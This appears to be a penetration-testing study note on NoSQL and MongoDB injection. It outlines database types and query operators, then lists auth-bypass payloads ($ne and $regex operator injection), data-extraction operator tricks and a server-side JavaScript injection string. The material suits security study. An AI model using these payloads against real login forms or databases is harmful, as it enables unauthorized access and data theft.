___
SQL but without tables. MongoDB is most popular. 
more common, with `MongoDB` now being the [5th most used](https://db-engines.com/en/ranking) database engine (as of November 2022).
The way `NoSQL` databases store data varies significantly across the different categories and implementations.

| Type                       | Description                                                                                                                                                        | Top 3 Engines (as of November 2022)                                                                                                                                                |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document-Oriented Database | Stores data in `documents` which contain pairs of `fields` and `values`. These documents are typically encoded in formats such as `JSON` or `XML`.                 | [MongoDB](https://www.mongodb.com/), [Amazon DynamoDB](https://aws.amazon.com/dynamodb/), [Google Firebase - Cloud Firestore](https://firebase.google.com/products/firestore/)     |
| Key-Value Database         | A data structure that stores data in `key:value` pairs, also known as a `dictionary`.                                                                              | [Redis](https://redis.io/), [Amazon DynamoDB](https://aws.amazon.com/dynamodb/), [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/)                          |
| Wide-Column Store          | Used for storing enormous amounts of data in `tables`, `rows`, and `columns` like a relational database, but with the ability to handle more ambiguous data types. | [Apache Cassandra](https://cassandra.apache.org/_/index.html), [Apache HBase](https://hbase.apache.org/), [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/) |
| Graph Database             | Stores data in `nodes` and uses `edges` to define relationships.                                                                                                   | [Neo4j](https://neo4j.com/), [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/), [Virtuoso](https://virtuoso.openlinksw.com/)                                |
## MongoDB
___
MongoDB Usage cheatsheet: https://www.mongodb.com/developer/products/mongodb/cheat-sheet/#connect-mongodb-shell

Mongo uses query operators to interact and compare fields. Here are some examples:
[query operators](https://www.mongodb.com/docs/manual/reference/operator/query/).

| Type       | Operator | Description                                                               | Example                                      |
| ---------- | -------- | ------------------------------------------------------------------------- | -------------------------------------------- |
| Comparison | `$eq`    | Matches values which are `equal to` a specified value                     | `type: {$eq: "Pink Lady"}`                   |
| Comparison | `$gt`    | Matches values which are `greater than` a specified value                 | `price: {$gt: 0.30}`                         |
| Comparison | `$gte`   | Matches values which are `greater than or equal to` a specified value     | `price: {$gte: 0.50}`                        |
| Comparison | `$in`    | Matches values which exist `in the specified array`                       | `type: {$in: ["Granny Smith", "Pink Lady"]}` |
| Comparison | `$lt`    | Matches values which are `less than` a specified value                    | `price: {$lt: 0.60}`                         |
| Logical    | `$not`   | Matches documents which `do not meet the conditions` of a specified query | `type: {$not: {$eq: "Granny Smith"}}`        |
| Evaluation | `$regex` | Matches values which `match a specified RegEx`                            | `type: {$regex: /^G.*/}`                     |
### Basic Injection Example
---
**Auth Bypass**
Normal data:
```
email=test@test.com&password=test
```
Becomes:
```
email[$ne]=test@test.com&password[$ne]=test
```
![](../../assets/Pasted%20image%2020250629152540.png)
This will evaluate to TRUE (unless the values actually exist) and bypass auth.
OR match anything and always eval to true:
```
email[$regex]=.*&password[$regex]=.*
```
**Data Extraction**
Ways can match ALL data from an injection point and return it:
- `name: {$ne: 'doesntExist'}`: Assuming `doesntExist` doesn't match any documents' names, this will match all documents.
- `name: {$gt: ''}`: This matches all documents whose name is 'bigger' than an empty string.
- `name: {$gte: ''}`: This matches all documents whose name is 'bigger or equal to' an empty string.
- `name: {$lt: '~'}`: This compares the first character of `name` to a Tilde character and matches if it is 'less'. This will not always work, but it works in this case because Tilde is the [largest printable ASCII value](https://www.asciitable.com/), and we know that all names in the collection are composed of ASCII characters.
- `name: {$lte: '~'}`: Same logic as above, except it additionally matches documents whose names start with `~`.

### Server-Side JavaScript Injection
---
Execute arbitrary JavaScript in the context of the database.
**Auth bypass**
![](../../assets/Pasted%20image%2020250629153121.png)
we could set `username` to `" || true || ""=="`, which should result in the query statement always returning `True`, regardless of what `this.username` and `this.password` are.
![](../../assets/Pasted%20image%2020250629153156.png)
